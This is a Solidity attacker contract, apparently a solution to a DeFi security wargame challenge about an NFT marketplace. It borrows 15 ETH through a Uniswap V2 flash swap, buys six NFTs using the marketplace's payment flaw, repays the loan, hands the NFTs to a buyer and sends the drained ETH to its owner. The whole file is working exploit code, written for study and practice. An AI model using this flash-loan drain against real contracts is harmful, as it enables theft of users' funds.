// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface IWETH9 { // can't import "WETH9.sol" as its version is 0.7.0
    function withdraw(uint) external;
    function deposit() external payable;
    function transfer(address, uint) external returns (bool);
    function balanceOf(address) external returns (uint);
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IFreeRiderMarketplace {
  function buyMany(uint256[] calldata tokenIds) external payable;
}

contract AttackFreeRiderNFTMarketplace is IERC721Receiver, Ownable {
  using Address for address payable;
  IWETH9 immutable private weth;
  IUniswapV2Pair immutable private uniswapPair;
  IERC721 immutable private nft;
  address immutable private buyer;
  IFreeRiderMarketplace immutable private freeRiderMarketplace;

  constructor(address _weth, address _uniswapPair, address _nft, address _buyer, address _marketplace) {
    weth = IWETH9(_weth);
    uniswapPair = IUniswapV2Pair(_uniswapPair);
    nft = IERC721(_nft);
    buyer = _buyer;
    freeRiderMarketplace = IFreeRiderMarketplace(_marketplace);
  }
    
  receive() external payable {}

  function attack() external onlyOwner {
    // should read: https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps
    uniswapPair.swap(15e18, 0, address(this), new bytes(1)); // flash loan of 15 eth.
  }

  function uniswapV2Call(address, uint amount0, uint, bytes calldata) external {
    // ignoring the checks.
    weth.withdraw(amount0); // thus we need to have a receive function
    uint[] memory tokenIds = new uint[](6);
    for (uint i = 0; i < 6; i++) {
      tokenIds[i] = i;
    }
    console.log("Attacker contract received ", address(this).balance, "wei (after unwrap) from uniswap"); // this will log 15eth.
    freeRiderMarketplace.buyMany{value: address(this).balance}(tokenIds);
    console.log("Attacker contract ends with: ", address(this).balance, "wei after buying NFTs"); // we end up with 90 eth
    // according to docs, I should deposit 15e18 / 0.997 = 15045135406218655967.90371113340020060181, so in below 150451355e11 works but 15045135"4"e11 doesn't.
    weth.deposit{value: 150451355e11}();
    weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));
    for (uint i = 0; i < 6; i++) {
      nft.safeTransferFrom(address(this), address(buyer), i);
    }
    payable(owner()).sendValue(address(this).balance); // transfer roughly 74.9 ETH. (this along with initial 0.5 & 45 eth from buyer should total around 120.4 eth)
  }

  // See: https://docs.openzeppelin.com/contracts/2.x/api/token/erc721#ERC721-safeTransferFrom-address-address-uint256- & https://docs.openzeppelin.com/contracts/2.x/api/token/erc721#IERC721Receiver-onERC721Received-address-address-uint256-bytes 
  function onERC721Received(address, address, uint256, bytes memory) external override pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

}